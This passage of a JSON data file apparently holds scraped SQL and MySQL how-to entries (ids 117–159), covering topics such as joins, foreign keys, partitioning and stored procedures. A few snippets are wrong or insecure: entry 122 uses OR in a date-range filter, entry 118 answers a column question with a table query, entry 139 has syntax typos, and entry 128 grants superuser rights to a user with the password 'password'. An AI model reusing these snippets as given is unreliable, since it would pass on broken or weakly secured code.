    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 117,
    "keyword": null,
    "link": null,
    "title": " How to Add a Default Value to a Column in MS SQL Server",
    "description": "ALTER TABLE <table_name> ADD DEFAULT <DEFAULT_VALUE> FOR <NAME_OF_COLUMN>\n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 118,
    "keyword": null,
    "link": null,
    "title": " How to View column names of a table in SQL",
    "description": "SELECT   \tTABLE_NAME FROM   \tINFORMATION_SCHEMA.TABLES \nDESCRIBE Table_Name;  OR   DESC Table_Name;\n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 119,
    "keyword": null,
    "link": null,
    "title": " How to check current user in mySQL",
    "description": "SELECT User, Host FROM mysql.user;\n-- mysql current user: SELECT USER(); -- or SELECT CURRENT_USER();\nSELECT USER(); \n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 120,
    "keyword": null,
    "link": null,
    "title": " How to convert DateTime to VarChar SQL",
    "description": "-- Create test case DECLARE @myDateTime DATETIME SET @myDateTime = '2008-05-03' -- Convert string SELECT LEFT(CONVERT(VARCHAR, @myDateTime, 120), 10) \n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 121,
    "keyword": null,
    "link": null,
    "title": " How to drop columns with constraint from a table in sql script",
    "description": "alter table tableName drop constraint [ConstraintName] go alter table tableName drop column columnName\n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 122,
    "keyword": null,
    "link": null,
    "title": " How to fetch data in between startfromdate to starenddate in sql",
    "description": "Select id from eventos_sapo where startDate >= '2013-01-03' OR endDate <= '2015-02-14' \n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 123,
    "keyword": null,
    "link": null,
    "title": " How to get number of months between 2 dates sql server",
    "description": "CREATE FUNCTION FullMonthsSeparation  (     @DateA DATETIME,     @DateB DATETIME ) RETURNS INT AS BEGIN     DECLARE @Result INT      DECLARE @DateX DATETIME     DECLARE @DateY DATETIME      IF(@DateA < @DateB)     BEGIN         SET @DateX = @DateA         SET @DateY = @DateB     END     ELSE     BEGIN         SET @DateX = @DateB         SET @DateY = @DateA     END      SET @Result = (                     SELECT                      CASE                          WHEN DATEPART(DAY, @DateX) > DATEPART(DAY, @DateY)                         THEN DATEDIFF(MONTH, @DateX, @DateY) - 1                         ELSE DATEDIFF(MONTH, @DateX, @DateY)                     END                     )      RETURN @Result END GO  SELECT dbo.FullMonthsSeparation('2009-04-16', '2009-05-15') as MonthSep -- =0 SELECT dbo.FullMonthsSeparation('2009-04-16', '2009-05-16') as MonthSep -- =1 SELECT dbo.FullMonthsSeparation('2009-04-16', '2009-06-16') as MonthSep -- =2\n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 124,
    "keyword": null,
    "link": null,
    "title": " How to select the nth row in a SQL database table?",
    "description": "SELECT * FROM (   SELECT     ROW_NUMBER() OVER (ORDER BY key ASC) AS rownumber,     columns   FROM tablename ) AS foo WHERE rownumber <= n \n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 125,
    "keyword": null,
    "link": null,
    "title": " How to start and stop mysql shell",
    "description": "sudo service mysql start \n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 126,
    "keyword": null,
    "link": null,
    "title": " How to start postgresql on windows",
    "description": "pg_ctl.exe restart -D  \"C:\\Program Files\\PostgreSQL\\9.6\\data\" \nnet start postgresql-9.5 \npg_ctl.exe restart -D \"<path upto data>\" \n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 127,
    "keyword": null,
    "link": null,
    "title": " Illuminate\\Database\\QueryException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'updated at' in 'field list'",
    "description": "class ABC extends Model { //to turn of just one field const UPDATED_AT = null; //to turn off timestamp completely public $timestamps = false;\n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 128,
    "keyword": null,
    "link": null,
    "title": " Illuminate\\Database\\QueryException : SQLSTATE[HY000] [1698] Access denied for user 'root'@'localhost'",
    "description": "$ sudo mysql -u root -p Now you can add a new MySQL user with the username of your choice.  mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; And finally grant superuser privileges to the user you just created.  mysql> GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost';  after that go and edit .env DB_USERNAME=newuser DB_PASSWORD=password \n",
    "reg_date": "2021-10-12T09:53:45.000Z"
  },
  {
    "id": 129,
    "keyword": null,
    "link": null,
    "title": " ImportError: No module named mysql.connector",
    "description": "sudo pip install mysql-connector-python\nModuleNotFoundError: No module named 'mysql.connector'; 'mysql' is not a package\n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 130,
    "keyword": null,
    "link": null,
    "title": " Import database from a file using mysql commandline",
    "description": "mysql -u username -p database_name < file.sql \n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 131,
    "keyword": null,
    "link": null,
    "title": " Incorrect string value: '\\xC4\\x81ne' for column",
    "description": "ALTER TABLE table_name CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 132,
    "keyword": null,
    "link": null,
    "title": " Incorrect string value: mysql",
    "description": "SET NAMES 'utf8'; SET CHARACTER SET utf8; \n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 133,
    "keyword": null,
    "link": null,
    "title": " Index a database column sql",
    "description": "CREATE INDEX [index name] ON [table name] ( [column name] )\n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 134,
    "keyword": null,
    "link": null,
    "title": " Insert from table tsql",
    "description": "SET IDENTITY_INSERT TABLE_TO ON INSERT INTO TABLE_TO (Col1, Col2, Col3, ...ColN) SELECT * FROM TABLE_FROM SET IDENTITY_INSERT TABLE_TO OFF\nINSERT INTO TABLE_NAME [(column1, column2, column3,...columnN)]    VALUES (value1, value2, value3,...valueN); \n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 135,
    "keyword": null,
    "link": null,
    "title": " Insert value list does not match column list: 1136 Column count doesn't match value count at row 2\"",
    "description": "In your database table not null columns created are less than the values that you are passing in the insert query  Example : Assume Your database table has 35 columns Then, Where as the values you are passing are 34 columns  This mismatch of columns is giving you the error. You must have forgot to pass the value for not null column. once you pass  it error will be resolved\n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 136,
    "keyword": null,
    "link": null,
    "title": " JBDC",
    "description": "jdbc:mysql://localhost:3306/db?allowPublicKeyRetrieval=true&useSSL=false \n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 137,
    "keyword": null,
    "link": null,
    "title": " JOIN Multiple Select Statements as tables",
    "description": "SELECT t1.ks, t1.[# Tasks], COALESCE(t2.[# Late], 0) AS [# Late] FROM      (SELECT ks, COUNT(*) AS '# Tasks' FROM Table GROUP BY ks) t1 LEFT JOIN     (SELECT ks, COUNT(*) AS '# Late' FROM Table WHERE Age > Palt GROUP BY ks) t2 ON (t1.ks = t2.ks); \n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 138,
    "keyword": null,
    "link": null,
    "title": " Laravel query builder toSql",
    "description": "$query = DB::table('table')->whereIn('some_field', [1,2,30]);  $sql = $query->toSql();  $bindings = $query->getBindings(); \nuse Illuminate\\Database\\Eloquent\\Builder;  public function scopeFakePersons(Builder $query): Builder {   return $query->where('is_fake', 1); }\n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 139,
    "keyword": null,
    "link": null,
    "title": " List all the items that have not been part of any purchase order. sql",
    "description": "SELECT DISTINCT I.*, ITO,itemID AS [NULL if never ordered] FROM Items As I LEFT JOIN ItemsInOrder AS ITO ON I.itemID=ITO.itemID WHERE ITO,itemID IS NULL\nSELECT * FROM Items WHERE itemID NOT IN (SELECT itemID FROM ItemsInOrder)\n",
    "reg_date": "2021-10-12T09:53:46.000Z"
  },
  {
    "id": 140,
    "keyword": null,
    "link": null,
    "title": " LoadError: cannot load such file -- mysql2/2.7/mysql2",
    "description": "rm Gemfile.lock gem uninstall mysql2 gem install mysql2 -v '0.5.2' -- --with-mysql-config=/usr/local/Cellar/mysql@5.7/5.7.25/bin/mysql_config --with-ldflags=-L/usr/local/opt/openssl/lib --with-cppflags=-I/usr/local/opt/openssl/include --platform=ruby bundle install \n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 141,
    "keyword": null,
    "link": null,
    "title": " Lost connection to MySQL server during query when dumping table",
    "description": "net_write_timeout = 900 #on my.cnf\n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 142,
    "keyword": null,
    "link": null,
    "title": " MYSQL HOT TO COUNT THE DURATION BETWEEN TWO DATES",
    "description": "To count the difference between dates in MySQL, use the DATEDIFF(enddate, startdate) function. The difference between startdate and enddate is expressed in days.\n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 143,
    "keyword": null,
    "link": null,
    "title": " Maximum execution time of 360 seconds exceeded",
    "description": "// you need to add this line at the bottom of your .htaccess file Before # END WordPress Like this...  php_value max_execution_time 1000 # END WordPress\nA better solution here is to change the config that controls phpMyAdmin and not the php.ini file.  If you change the php.ini file you effect everything in PHP and should you write that infinite loop that we all do from time to time it will take longer to terminate your infinite loop than is sensible.  Note: If you are using the 64bit WAMPServer the base folder name will be wamp64 instead of wamp so please amend the below folder names accordingly.  So change \\wamp\\alias\\phpmyadmin.conf. By default it will look something like this although your version of phpMyAdmin will probably be different:  Alias /phpmyadmin \"c:/wamp/apps/phpmyadmin4.1.14/\"  <Directory \"c:/wamp/apps/phpmyadmin4.1.14/\">    Options Indexes FollowSymLinks MultiViews    AllowOverride all   <IfDefine APACHE24>     Require local   </IfDefine>   <IfDefine !APACHE24>     Order Deny,Allow       Deny from all       Allow from localhost ::1 127.0.0.1     </IfDefine>   php_admin_value upload_max_filesize 128M   php_admin_value post_max_size 128M   php_admin_value max_execution_time 360   php_admin_value max_input_time 360 </Directory> To extend the maximum time limit for importing a database, change the php_admin_value max_execution_time parameter. You may also need to change the other parameters as larger databases tend to come in larger files and take longer to read as well. Example:    php_admin_value upload_max_filesize 1024M   php_admin_value post_max_size 1024M   php_admin_value max_execution_time 1800   php_admin_value max_input_time 1800\n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 144,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'MySQLdb'",
    "description": "You can install mysqlclient with pip  If using Python3, try this:  pip3 install mysqlclient  or in Python2  pip install mysqlclient\nsudo apt-get install libmysqlclient-dev sudo apt-get install libssl-dev pip install mysqlclient\nsudo apt-get install -y python3-mysqldb\nconda install -c anaconda mysqlclient \nsudo apt-get install -y python-dev libmysqlclient-dev && sudo pip install mysqlclient \n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 145,
    "keyword": null,
    "link": null,
    "title": " Msg 241, Level 16, State 1, Line 12 Conversion failed when converting date and/or time from character string.",
    "description": "DECLARE @Value nVarchar(MAX)='2016-03-01 00:00:00.000000' SELECT CONVERT(DATETIME,LEFT(@Value,23),101) \n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 146,
    "keyword": null,
    "link": null,
    "title": " MySQL AND Operator",
    "description": "SELECT * FROM `tableName` WHERE `ColumnName` IN (1,2,3);\nThe AND operator is a logical operator that combines two or more Boolean expressions and returns true only if both expressions evaluate to true. The AND operator returns false if one of the two expressions evaluate to false.  Here is the syntax of the AND operator:  SELECT      customername,      country,      state FROM     customers WHERE     country = 'USA' AND state = 'CA';\n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 147,
    "keyword": null,
    "link": null,
    "title": " MySQL DELETE JOIN",
    "description": "MySQL also allows you to use the INNER JOIN clause in the DELETE statement to delete rows from a table and the matching rows in another table.  For example, to delete rows from both T1 and T2 tables that meet a specified condition, you use the following statement:  DELETE T1, T2 FROM T1 INNER JOIN T2 ON T1.key = T2.key WHERE condition; Notice that you put table names T1 and T2 between the DELETE and FROM keywords. If you omit T1 table, the DELETE statement only deletes rows in T2 table. Similarly, if you omitT2 table, the DELETE statement will delete only rows in T1 table.  The expression T1.key = T2.key specifies the condition for matching rows between T1 andT2 tables that will be deleted.  The condition in the  WHERE clause determine rows in the T1 and T2 that will be deleted.\n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 148,
    "keyword": null,
    "link": null,
    "title": " MySQL DISTINCT",
    "description": "SELECT COUNT(DISTINCT productId) from  table_name WHERE keyword='$keyword' \nWhen querying data from a table, you may get duplicate rows. In order to remove these duplicate rows, you use the DISTINCT clause in the SELECT statement.  Here is the syntax of the DISTINCT clause:  SELECT DISTINCT     select_list FROM     table_name;\nSELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nSELECT DISTINCT Column_name FROM table_name;\nSELECT DISTINCT location FROM users; \n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 149,
    "keyword": null,
    "link": null,
    "title": " MySQL DROP TABLE",
    "description": "DROP TABLE table_name\nDROP TABLE IF EXISTS dbo.Scores\nDROP TABLE table_name;\nDELETE FROM `table_name` [WHERE condition];\nSET FOREIGN_KEY_CHECKS = 0; drop table if exists <your_1st_table>; drop table if exists <your_2nd_table>; SET FOREIGN_KEY_CHECKS = 1;\nTo remove existing tables, you use the MySQL DROP TABLE statement.  Here is the basic syntax of the DROP TABLE statement:  DROP [TEMPORARY] TABLE [IF EXISTS] table_name [, table_name] ... [RESTRICT | CASCADE] The DROP TABLE statement removes a table and its data permanently from the database. In MySQL, you can also remove multiple tables using a single DROP TABLE statement, each table is separated by a comma (,).  The TEMPORARY option allows you to remove temporary tables only. It ensures that you do not accidentally remove non-temporary tables.  The IF EXISTS option conditionally drop a table only if it exists. If you drop a non-existing table with the IF EXISTS option, MySQL generates a NOTE, which can be retrieved using the SHOW WARNINGS statement.  Note that the DROP TABLE statement only drops tables. It doesn&rsquo;t remove specific user privileges associated with the tables. Therefore, if you create a table with the same name as the dropped one, MySQL will apply the existing privileges to the new table, which may pose a security risk.  The RESTRICT and CASCADE  options are reserved for the future versions of MySQL.\n",
    "reg_date": "2021-10-12T09:53:47.000Z"
  },
  {
    "id": 150,
    "keyword": null,
    "link": null,
    "title": " MySQL Foreign Key",
    "description": "ALTER TABLE table_name DROP CONSTRAINT fk_name;\n-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nCREATE TABLE parent (     id INT NOT NULL,     PRIMARY KEY (id) ) ENGINE=INNODB;  CREATE TABLE child (     id INT,     parent_id INT,     INDEX par_ind (parent_id),     FOREIGN KEY (parent_id)         REFERENCES parent(id)         ON DELETE CASCADE ) ENGINE=INNODB;\n                                     CREATE TABLE products(     productId INT AUTO_INCREMENT PRIMARY KEY,     productName varchar(100) not null,     categoryId INT NOT NULL,     CONSTRAINT fk_category     FOREIGN KEY (categoryId)      REFERENCES categories(categoryId)         ON UPDATE CASCADE         ON DELETE CASCADE ) ENGINE=INNODB;\nALTER TABLE tryholpz_demo07.core_modules  ADD COLUMN belongs_to_role INT,  ADD FOREIGN KEY core_modules(belongs_to_role) REFERENCES role_specific_modules_info(id) ON DELETE CASCADE\nHere is the basic syntax of defining a foreign key constraint in the CREATE TABLE or ALTER TABLE statement:  [CONSTRAINT constraint_name] FOREIGN KEY [foreign_key_name] (column_name, ...) REFERENCES parent_table(colunm_name,...) [ON DELETE reference_option] [ON UPDATE reference_option] In this syntax:  First, specify the name of foreign key constraint that you want to create after the CONSTRAINT keyword. If you omit the constraint name, MySQL automatically generates a name for the foreign key constraint.  Second, specify a list of comma-separated foreign key columns after the FOREIGN KEY keywords. The foreign key name is also optional and is generated automatically if you skip it.  Third, specify the parent table followed by a list of comma-separated columns to which the foreign key columns reference.  Finally, specify how foreign key maintains the referential integrity between the child and parent tables by using the ON DELETE and ON UPDATE clauses.  The reference_option determines action which MySQL will take when values in the parent key columns are deleted (ON DELETE) or updated (ON UPDATE).  MySQL has five reference options: CASCADE, SET NULL, NO ACTION, RESTRICT, and SET DEFAULT.  CASCADE: if a row from the parent table is deleted or updated, the values of the matching rows in the child table automatically deleted or updated. SET NULL:  if a row from the parent table is deleted or updated, the values of the foreign key column (or columns) in the child table are set to NULL. RESTRICT:  if a row from the parent table has a matching row in the child table, MySQL rejects deleting or updating rows in the parent table. NO ACTION: is the same as RESTRICT. SET DEFAULT: is recognized by the MySQL parser. However, this action is rejected by both InnoDB and NDB tables. In fact, MySQL fully supports three actions: RESTRICT, CASCADE and SET NULL.  If you don&rsquo;t specify the ON DELETE and ON UPDATE clause, the default action is RESTRICT.  MySQL FOREIGN KEY examples Let&rsquo;s create a new database called fkdemo for the demonstration.  CREATE DATABASE fkdemo;  USE fkdemo; RESTRICT & NO ACTION actions Inside the fkdemo database, create two tables categories and products:  CREATE TABLE categories(     categoryId INT AUTO_INCREMENT PRIMARY KEY,     categoryName VARCHAR(100) NOT NULL ) ENGINE=INNODB;  CREATE TABLE products(     productId INT AUTO_INCREMENT PRIMARY KEY,     productName varchar(100) not null,     categoryId INT,     CONSTRAINT fk_category     FOREIGN KEY (categoryId)          REFERENCES categories(categoryId) ) ENGINE=INNODB; The categoryId in the products table is the foreign key column that refers to the categoryId column in the  categories table.  Because we don&rsquo;t specify any ON UPDATE and ON DELETE clauses, the default action is RESTRICT for both update and delete operation.\n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 151,
    "keyword": null,
    "link": null,
    "title": " MySQL GROUP BY",
    "description": "SELECT      c1, c2,..., cn, aggregate_function(ci) FROM     table WHERE     where_conditions GROUP BY c1 , c2,...,cn;\n SELECT column_name(s)   FROM table_name   WHERE condition   GROUP BY column_name(s)   HAVING condition   ORDER BY column_name(s); \nSELECT Manufacturer, COUNT(*) AS ModelsCount FROM Products WHERE Price > 30000 GROUP BY Manufacturer ORDER BY ModelsCount DESC \n-- SELECT SUM(<column_name>) FROM <table_name> WHERE <condition> <group by>; SELECT SUM(amount) FROM invoices; SELECT client_name, SUM(amount) FROM invoices GROUP BY client_name;\n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 152,
    "keyword": null,
    "link": null,
    "title": " MySQL INSERT IGNORE Statement",
    "description": "When you use the INSERT statement to add multiple rows to a table and if an error occurs during the processing, MySQL terminates the statement and returns an error. As the result, no rows are inserted into the table.  However, if you use the INSERT IGNORE statement, the rows with invalid data that cause the error are ignored and the rows with valid data are inserted into the table.  The syntax of the INSERT IGNORE statement is as follows:  INSERT IGNORE INTO table(column_list) VALUES( value_list),       ( value_list),       ...\n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 153,
    "keyword": null,
    "link": null,
    "title": " MySQL Join",
    "description": "SELECT      m.member_id,      m.name member,      c.committee_id,      c.name committee FROM     members m INNER JOIN committees c  \tON c.name = m.name;\n-- MySQL INNER JOINS return all rows from multiple tables where the join condition is met.  SELECT columns FROM table1  INNER JOIN table2 ON table1.column = table2.column;  -- LEFT OUTER JOIN -- Another type of join is called a MySQL LEFT OUTER JOIN. This type of join returns all rows from the LEFT-hand table specified in the ON condition and only those rows from the other table where the joined fields are equal (join condition is met).  SELECT columns FROM table1 LEFT JOIN table2 ON table1.column = table2.column;  -- RIGHT OUTER JOIN -- Another type of join is called a MySQL RIGHT OUTER JOIN. This type of join returns all rows from the RIGHT-hand table specified in the ON condition and only those rows from the other table where the joined fields are equal (join condition is met).  SELECT columns FROM table1 RIGHT JOIN table2 ON table1.column = table2.column;  -- The mySQL CROSS JOIN produces a result set which is the number of rows in the first table multiplied by the number of rows in the second table if no WHERE clause is used along with CROSS JOIN. This kind of result is called as Cartesian Product.  -- If WHERE clause is used with CROSS JOIN, it functions like an INNER JOIN.  SELECT columns FROM table1  CROSS JOIN table2;\nA relational database consists of multiple related tables linking together using common columns which are known as foreign key columns. Because of this, data in each table is incomplete from the business perspective. MySQL supports the following types of joins:  Inner join Left join Right join Cross join  The following shows the basic syntax of the inner join clause that joins two tables table_1 and table_2:  SELECT column_list FROM table_1 INNER JOIN table_2 ON join_condition;   SELECT column_list FROM table_1 INNER JOIN table_2 USING (column_name);  SELECT column_list  FROM table_1  LEFT JOIN table_2 USING (column_name); Here is the syntax of the right join:  SELECT column_list  FROM table_1  RIGHT JOIN table_2 ON join_condition;  The following shows the basic syntax of the cross join clause:  SELECT select_list FROM table_1 CROSS JOIN table_2;\nJoins are used with select statement. it is used to select data from multiple table. Types: MySQL INNER JOIN (or simple join) MySQL LEFT OUTER JOIN (or LEFT JOIN) MySQL RIGHT OUTER JOIN (or RIGHT JOIN)  Inner JOIN : The INNER JOIN is used to return all rows from multiple tables where the join condition is satisfied. It is the most common type of join.  Left Outer Join: The LEFT OUTER JOIN returns all rows from the left hand table specified in the ON condition and only those rows from the other table where the join condition is fulfilled.  Right Outer Join: The Right Outer Join returns all rows from the RIGHT-hand table specified in the ON condition and only those rows from the other table where he join condition is fulfilled.\n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 154,
    "keyword": null,
    "link": null,
    "title": " MySQL LIKE",
    "description": "WHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"\nSELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\nSELECT name FROM products WHERE name LIKE '%Value1' OR name LIKE '%Value2';\t \nThe LIKE operator is a logical operator that tests whether a string contains a specified pattern or not. Here is the syntax of the LIKE operator:  expression LIKE pattern ESCAPE escape_character  This example uses the LIKE operator to find employees whose first names start with a:  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     firstName LIKE 'a%';          This example uses the LIKE operator to find employees whose last names end with on e.g., Patterson, Thompson:  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     lastName LIKE '%on';               For example, to find all employees whose last names contain on , you use the following query with the pattern %on%  SELECT      employeeNumber,      lastName,      firstName FROM     employees WHERE     lastname LIKE '%on%';\nSELECT * from fiberbox where field REGEXP '1740|1938|1940'; \neturns true if the operand value matches a pattern. Example: Returns true if the user&rsquo;s first_name ends with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name LIKE '%son'; \n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 155,
    "keyword": null,
    "link": null,
    "title": " MySQL PARTITION BY month automatically",
    "description": "ALTER TABLE t1 PARTITION BY RANGE(transaction_date)( PARTITION JAN VALUES LESS THAN (UNIX_TIMESTAMP('2013-02-01')), PARTITION FEB VALUES LESS THAN (UNIX_TIMESTAMP('2013-03-01')), PARTITION MAR VALUES LESS THAN (UNIX_TIMESTAMP('2013-04-01')), PARTITION APR VALUES LESS THAN (UNIX_TIMESTAMP('2013-05-01')), PARTITION MAY VALUES LESS THAN (UNIX_TIMESTAMP('2013-06-01')), PARTITION JUN VALUES LESS THAN (UNIX_TIMESTAMP('2013-07-01')), PARTITION JUL VALUES LESS THAN (UNIX_TIMESTAMP('2013-08-01')), PARTITION AUG VALUES LESS THAN (UNIX_TIMESTAMP('2013-09-01')), PARTITION SEP VALUES LESS THAN (UNIX_TIMESTAMP('2013-10-01')), PARTITION `OCT` VALUES LESS THAN (UNIX_TIMESTAMP('2013-11-01')), PARTITION NOV VALUES LESS THAN (UNIX_TIMESTAMP('2013-12-01')), PARTITION `DEC` VALUES LESS THAN (UNIX_TIMESTAMP('2014-01-01')) ); \nALTER TABLE t1  PARTITION BY RANGE( MONTH(FROM_UNIXTIME(transaction_date) ) SUBPARTITION BY HASH( DAY(FROM_UNIXTIME(transaction_date)) ) SUBPARTITIONS 31 (     PARTITION p0 VALUES LESS THAN (2),     PARTITION p1 VALUES LESS THAN (3),     PARTITION p2 VALUES LESS THAN (4),     PARTITION p3 VALUES LESS THAN (5),     PARTITION p4 VALUES LESS THAN (6),     PARTITION p5 VALUES LESS THAN (7),     PARTITION p6 VALUES LESS THAN (8),     PARTITION p7 VALUES LESS THAN (9),     PARTITION p8 VALUES LESS THAN (10),     PARTITION p9 VALUES LESS THAN (11),     PARTITION p10 VALUES LESS THAN (12),     PARTITION p11 VALUES LESS THAN MAXVALUE ); \n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 156,
    "keyword": null,
    "link": null,
    "title": " MySQL Stored Procedures",
    "description": "-- MySQL  -- example DELIMITER $$ -- Changes delimiter to $$ so can use ; within the procedure CREATE PROCEDURE select_employees() BEGIN \tselect *  \tfrom employees  \tlimit 1000; -- Use the ; symbol within the procedure END$$  DELIMITER ; -- Resets the delimiter  /* syntax: DELIMITER $$ -- Changes delimiter to $$ so can use ; within the procedure CREATE PROCEDURE <Your-procedure-name>(<argument1><argument2>...<argumentN>) BEGIN \t<Code-that-stored-procedure-executes>; -- Use the ; symbol within the procedure END$$ DELIMITER ; -- Resets the delimiter */\nDELIMITER $$  CREATE PROCEDURE GetCustomers() BEGIN \tSELECT  \t\tcustomerName,  \t\tcity,  \t\tstate,  \t\tpostalCode,  \t\tcountry \tFROM \t\tcustomers \tORDER BY customerName;     END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL GetCustomers(); \nDELIMITER $$  CREATE PROCEDURE GetAllProducts() BEGIN \tSELECT *  FROM products; END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL GetAllProducts(); \n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 157,
    "keyword": null,
    "link": null,
    "title": " MySQL UPDATE JOIN",
    "description": "UPDATE  t1 LEFT JOIN         t2 ON      t2.id = t1.id SET     t1.col1 = newvalue WHERE   t2.id IS NULL\nYou often use joins to query rows from a table that have (in the case of INNER JOIN) or may not have (in the case of LEFT JOIN) matching rows in another table. In MySQL, you can use the JOIN clauses in the UPDATE statement to perform the cross-table update.  The syntax of the MySQL UPDATE JOIN  is as follows:  UPDATE T1, T2, [INNER JOIN | LEFT JOIN] T1 ON T1.C1 = T2. C1 SET T1.C2 = T2.C2,      T2.C3 = expr WHERE condition Let&rsquo;s examine the MySQL UPDATE JOIN  syntax in greater detail:  First, specify the main table ( T1 ) and the table that you want the main table to join to ( T2 ) after the UPDATE clause. Notice that you must specify at least one table after the UPDATE  clause. The data in the table that is not specified after the UPDATE  clause will not be updated. Next, specify a kind of join you want to use i.e., either INNER JOIN  or LEFT JOIN  and a join predicate. The JOIN clause must appear right after the UPDATE clause. Then, assign new values to the columns in T1 and/or T2 tables that you want to update. After that, specify a condition in the WHERE clause to limit rows to rows for updating.\nUPDATE T1, T2, [INNER JOIN | LEFT JOIN] T1 ON T1.C1 = T2. C1 SET T1.C2 = T2.C2,      T2.C3 = expr WHERE condition \nUPDATE employees     LEFT JOIN     merits ON employees.performance = merits.performance  SET      salary = salary + salary * 0.015 WHERE     merits.percentage IS NULL;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 158,
    "keyword": null,
    "link": null,
    "title": " MySQL WHERE",
    "description": "SELECT * FROM `tableName` WHERE `ColumnName` IN (1,2,3);\nSELECT      select_list FROM     table_name WHERE     search_condition;     AND OR Like In Is     officeCode = 1;\nSELECT * FROM Customers WHERE Country='Mexico';\n",
    "reg_date": "2021-10-12T09:53:48.000Z"
  },
  {
    "id": 159,
    "keyword": null,
    "link": null,
    "title": " MySQL datetime format",
